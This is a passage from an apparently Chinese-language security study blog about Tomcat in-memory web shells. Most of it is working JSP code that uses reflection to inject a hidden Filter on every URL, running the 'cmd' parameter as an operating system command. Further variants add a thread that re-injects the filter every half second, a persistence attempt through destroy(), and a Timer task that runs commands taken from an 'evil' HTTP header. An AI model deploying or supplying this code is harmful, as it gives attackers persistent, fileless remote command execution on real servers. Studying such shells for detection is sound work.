class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.HashMap&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//首先通过反射获取到context</span></span><br><span class="line"></span><br><span class="line">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line">    Class&lt;? extends ServletContext&gt; aClass = servletContext.getClass();</span><br><span class="line">    Field appContext = aClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appContext.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);</span><br><span class="line">    Field stdContext = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdContext.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Filter filter = <span class="keyword">new</span> Filter() &#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">            String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            StringBuffer res = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">            <span class="comment">//加一个系统的判断</span></span><br><span class="line">            String os = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">boolean</span> isWin = <span class="keyword">false</span>;</span><br><span class="line">            BufferedReader bufferedReader;</span><br><span class="line">            <span class="keyword">if</span> (os != <span class="keyword">null</span> &amp;&amp; os.toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">                isWin = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (isWin == <span class="keyword">false</span>) &#123;</span><br><span class="line">                    bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(<span class="string">&quot;cmd /C &quot;</span> + cmd).getInputStream()));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String len;</span><br><span class="line">                <span class="keyword">while</span> ((len = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    res.append(len + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                res.append(e.getMessage());</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            response.getWriter().print(<span class="string">&quot;&lt;pre&gt;&quot;</span> + res.toString() + <span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//接下来创建一个FilterDef开始添加Filter</span></span><br><span class="line">    FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    filterDef.setFilterName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">    FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    filterMap.setFilterName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());<span class="comment">//添加的是当前diepatcher类型的名字</span></span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">    Constructor&lt;ApplicationFilterConfig&gt; declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">    declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">    Field configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Map filterConfigs = (Map) configs.get(standardContext);</span><br><span class="line">    filterConfigs.put(<span class="string">&quot;test&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line">    filter.destroy();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">testThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="comment">//每隔0.5秒执行一次</span></span><br><span class="line">            Thread.sleep(<span class="number">500</span>);</span><br><span class="line">            <span class="comment">//获取filterDefs并做判断</span></span><br><span class="line"></span><br><span class="line">            Field filterDefsField = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterDefs&quot;</span>);</span><br><span class="line">            filterDefsField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            HashMap filterDefs = (HashMap) filterDefsField.get(standardContext);</span><br><span class="line">            <span class="keyword">if</span> (!filterDefs.containsKey(<span class="string">&quot;test&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">                filterDef.setFilter(filter);</span><br><span class="line">                filterDef.setFilterName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">                filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">                standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">                FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">                filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">                filterMap.setFilterName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">                filterMap.setDispatcher(DispatcherType.REQUEST.name());<span class="comment">//添加的是当前diepatcher类型的名字</span></span><br><span class="line">                standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">                Constructor&lt;ApplicationFilterConfig&gt; declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">                declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">                Field configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">                configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Map filterConfigs = (Map) configs.get(standardContext);</span><br><span class="line">                filterConfigs.put(<span class="string">&quot;test&quot;</span>, filterConfig);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    test();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">new</span> testThread().start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>



<p>filter的destory好像是在服务器关闭的时候调用的?</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220424103747041.png" alt="image-20220424103747041"></p>
<p>destory方法确实是在关闭tomcat的时候调用了</p>
<p>因为是关闭服务器调用的,所以代码调试断点没用,使用find Usages找到在<code>ApplicationFilterConfig#release</code>方法中调用了destory方法</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220424104205259.png" alt="image-20220424104205259"></p>
<p>在<code>StandardContext#filterStop</code>方法中调用了release方法,这个方法的作用呢就是释放当前context的所有过滤器</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220424104347716.png" alt="image-20220424104347716"></p>
<p>在standardContext中调用stopInternal(),其中调用到了stop</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220424105554811.png" alt="image-20220424105554811"></p>
<p>在lifeCycle的实现类lifeCycleBase中的stop方法中   调用<code>stopInternal()</code>让组件自行实现关闭</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220424105659039.png" alt="image-20220424105659039"></p>
<p>综上大概就是我自己找的filter.destory的调用链</p>
<p>对此调用链我有以下不成熟的想法:</p>
<p>1.可以拿来测试destory中插入新注册一个filter的代码能否正常实现</p>
<p>2.既然在服务器关闭的时候会调用到destory方法,是不是可以在destory方法中加入持久化存储filter的代码呢</p>
<p>利用destory新注册一个filter</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//首先通过反射获取到context</span></span><br><span class="line"></span><br><span class="line">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line">    Class&lt;? extends ServletContext&gt; aClass = servletContext.getClass();</span><br><span class="line">    Field appContext = aClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appContext.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);</span><br><span class="line">    Field stdContext = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdContext.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Filter filter = <span class="keyword">new</span> Filter() &#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">            String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            StringBuffer res = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">            <span class="comment">//加一个系统的判断</span></span><br><span class="line">            String os = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">boolean</span> isWin = <span class="keyword">false</span>;</span><br><span class="line">            BufferedReader bufferedReader;</span><br><span class="line">            <span class="keyword">if</span> (os != <span class="keyword">null</span> &amp;&amp; os.toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">                isWin = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (isWin == <span class="keyword">false</span>) &#123;</span><br><span class="line">                    bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(<span class="string">&quot;cmd /C &quot;</span> + cmd).getInputStream()));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String len;</span><br><span class="line">                <span class="keyword">while</span> ((len = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    res.append(len + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                res.append(e.getMessage());</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            response.getWriter().print(<span class="string">&quot;&lt;pre&gt;&quot;</span> + res.toString() + <span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            Filter inner=<span class="keyword">new</span> Filter() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">                    String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                    StringBuffer res = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">                    <span class="comment">//加一个系统的判断</span></span><br><span class="line">                    String os = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">boolean</span> isWin = <span class="keyword">false</span>;</span><br><span class="line">                    BufferedReader bufferedReader;</span><br><span class="line">                    <span class="keyword">if</span> (os != <span class="keyword">null</span> &amp;&amp; os.toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">                        isWin = <span class="keyword">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (isWin == <span class="keyword">false</span>) &#123;</span><br><span class="line">                            bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(<span class="string">&quot;cmd /C &quot;</span> + cmd).getInputStream()));</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        String len;</span><br><span class="line">                        <span class="keyword">while</span> ((len = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            res.append(len + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        res.append(e.getMessage());</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                    response.getWriter().print(<span class="string">&quot;&lt;pre&gt;&quot;</span> + res.toString() + <span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">//接下来创建一个FilterDef开始添加Filter</span></span><br><span class="line">            FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">            filterDef.setFilter(inner);</span><br><span class="line">            filterDef.setFilterName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">            filterDef.setFilterClass(inner.getClass().getName());</span><br><span class="line">            standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">            FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">            filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">            filterMap.setFilterName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">            filterMap.setDispatcher(DispatcherType.REQUEST.name());<span class="comment">//添加的是当前diepatcher类型的名字</span></span><br><span class="line">            standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">            Constructor&lt;ApplicationFilterConfig&gt; declaredConstructor = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            ApplicationFilterConfig filterConfig = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                filterConfig = (ApplicationFilterConfig) declaredConstructor.newInstance(standardContext, filterDef);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Field configs = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Map filterConfigs = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                filterConfigs = (Map) configs.get(standardContext);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            filterConfigs.put(<span class="string">&quot;test&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//接下来创建一个FilterDef开始添加Filter</span></span><br><span class="line">    FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    filterDef.setFilterName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">    FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    filterMap.setFilterName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());<span class="comment">//添加的是当前diepatcher类型的名字</span></span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">    Constructor&lt;ApplicationFilterConfig&gt; declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">    declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">    Field configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Map filterConfigs = (Map) configs.get(standardContext);</span><br><span class="line">    filterConfigs.put(<span class="string">&quot;test&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>



<p>用上面的代码,运行之后发现问题很大,首先调用<code>StandardContext#filterStop</code>方法确实调用到了destory方法,但是呢,里面剩余的注册新的filter方法并没有调用</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220424111840905.png" alt="image-20220424111840905"></p>
<p>在别的jsp页面获取StandardContext调用filterStop并没有调用到这个filter的destory方法</p>
<h3 id="Timer内存马"><a href="#Timer内存马" class="headerlink" title="Timer内存马"></a>Timer内存马</h3><p>Timer 会创建一个定时任务线程 TimerThread，Timer 的特性是，如果不是所有未完成的任务都已完成执行，或不调用 Timer 对象的<code>cancel</code> 方法，这个线程是不会停止，也不会被 GC 的，因此，这个任务会一直执行下去，直到应用关闭。</p>
<p>在线程中获取所需对象的操作和之前tomcat内存马的时候从线程中获取context有异曲同工之妙</p>
<p>模仿着su18大佬的代码调试着跟了一遍流程,写了一遍,他这里写的这个getField函数是真巧妙,我觉得之前通过threadGroup获取context的时候各种getSuperClass都把人整晕了,现在一个函数就能解决问题</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Hello World!&lt;/h2&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getHeader</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String cmd=<span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();</span><br><span class="line">            Thread[] threads = (Thread[]) getField(threadGroup, <span class="string">&quot;threads&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span>(Thread thread: threads)&#123;</span><br><span class="line">                <span class="keyword">if</span>(thread!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                    String threadName=thread.getName();</span><br><span class="line">                    <span class="keyword">if</span>(threadName.contains(<span class="string">&quot;Poller&quot;</span>) &amp;&amp; threadName.contains(<span class="string">&quot;http&quot;</span>))&#123;</span><br><span class="line">                        ArrayList processors;</span><br><span class="line">                        Object target = getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span>(target <span class="keyword">instanceof</span> Runnable)&#123;</span><br><span class="line">                            <span class="keyword">try</span>&#123;</span><br><span class="line">                                processors=(ArrayList)getField(getField(getField(getField(target,<span class="string">&quot;this$0&quot;</span>),<span class="string">&quot;handler&quot;</span>),<span class="string">&quot;global&quot;</span>),<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">for</span>(Object processor:processors)&#123;</span><br><span class="line">                                <span class="keyword">if</span>(processor!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                                    Object req = getField(processor, <span class="string">&quot;req&quot;</span>);</span><br><span class="line">                                    String temp=(String) req.getClass().getMethod(<span class="string">&quot;getHeader&quot;</span>,String.class).invoke(req,<span class="string">&quot;evil&quot;</span>);</span><br><span class="line">                                    <span class="keyword">if</span>(temp!=<span class="keyword">null</span>&amp;&amp;!temp.isEmpty())&#123;</span><br><span class="line">                                        cmd=temp;</span><br><span class="line">                                        <span class="keyword">return</span> cmd;</span><br><span class="line">                                    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;wrong!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getField</span><span class="params">(Object object, String fieldName)</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;?&gt; objectClass = object.getClass();</span><br><span class="line">        Field field=<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (objectClass!=Object.class)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                field=objectClass.getDeclaredField(fieldName);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">                objectClass=objectClass.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(field==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchFieldException(fieldName);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">return</span> field.get(object);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    java.util.Timer ececute=<span class="keyword">new</span> java.util.Timer();</span><br><span class="line">    ececute.schedule(<span class="keyword">new</span> java.util.TimerTask() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            String cmd=getHeader();</span><br><span class="line">            <span class="keyword">if</span>(!cmd.equals(<span class="string">&quot;wrong!&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>为什么这里不采用request来执行命令呢</p>
<p>在前面的分析中介绍过，Acceptor的作用是控制与tomcat建立连接的数量，但Acceptor仅仅负责建立连接。socket内容的读写是通过Poller来实现的。</p>
<p>为什么可以通过这样的方式获取到request对象,我觉得牵扯到了tomcat架构的问题,我觉得目前只需要对当前链条做一个复现,大概理解这些涉及到的类都是干嘛的就行</p>
<p>Poller线程-&gt;target(Poller)-&gt;this$0–&gt;handler—&gt;global(RuquestGroupInfo)—&gt;processors—&gt;RequestInfo—&gt;req(Request)</p>
